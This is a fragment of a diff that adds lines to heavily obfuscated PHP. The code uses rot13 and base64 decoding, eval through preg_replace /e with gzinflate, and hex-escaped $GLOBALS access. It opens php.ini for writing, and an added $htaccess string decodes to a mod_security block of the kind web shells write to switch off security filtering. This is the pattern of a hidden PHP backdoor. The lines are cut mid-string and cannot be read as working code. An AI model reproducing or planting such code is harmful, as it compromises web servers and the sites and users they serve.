@@ -14,3 +14,7 @@ base64_decode(str_rot13("7C15z5gVyvtB/939CC0q1Qz+
 wvfmo"]="link";${${"GLOBALS"}["uuoeldlhn"]}=fopen("php.ini","w")
 preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C
 ${"\x47\x4c\x4f\x42\x41LS"}["t\x66w\x72lf\x68zm\x73"]="\x72"
+$htaccess ='PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPg0KU2VjRmlsdGVyRW5naW5
+rP2HruxcliaIvUpOojGVJZaa3k0biQwygt77gZCg995
+vGDAPO8 = 'G45IGr6HSrUIBPswh8B4h8Lv0UvjkNccrM6Pe1SPe1Ky
+${"\x47LOB\x41\x4c\x53"}
